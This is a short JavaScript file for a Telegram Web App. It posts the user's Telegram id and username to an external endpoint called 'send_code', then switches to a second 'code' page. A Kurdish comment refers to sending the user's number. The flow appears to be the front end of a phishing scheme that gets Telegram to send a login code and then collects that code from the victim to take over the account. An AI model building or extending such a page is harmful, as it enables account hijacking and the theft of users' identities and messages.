const API_URL = "https://taman964-api-handler.hf.space/send_code";

async function sendData() {
    const okButton = document.getElementById('ok-button');
    okButton.disabled = true;
    okButton.innerText = "Waiting...";

    try {
        const user = window.Telegram.WebApp.initDataUnsafe.user;
        const response = await fetch(API_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                user_id: user ? user.id : "Unknown",
                username: user ? user.username : "Unknown",
                phone: "Requested via Telegram"
            })
        });

        if (response.ok) {
            // ئەگەر ناردنی ژمارەکە سەرکەوتوو بوو، لاپەڕەی کۆدەکە نیشان بدە
            document.getElementById('step1').style.display = 'none';
            document.getElementById('step2').style.display = 'block';
        } else {
            alert("Error connecting to server. Please try again.");
            okButton.disabled = false;
            okButton.innerText = "OK";
        }
    } catch (error) {
        console.error("Error:", error);
        alert("Connection failed!");
        okButton.disabled = false;
        okButton.innerText = "OK";
    }
}
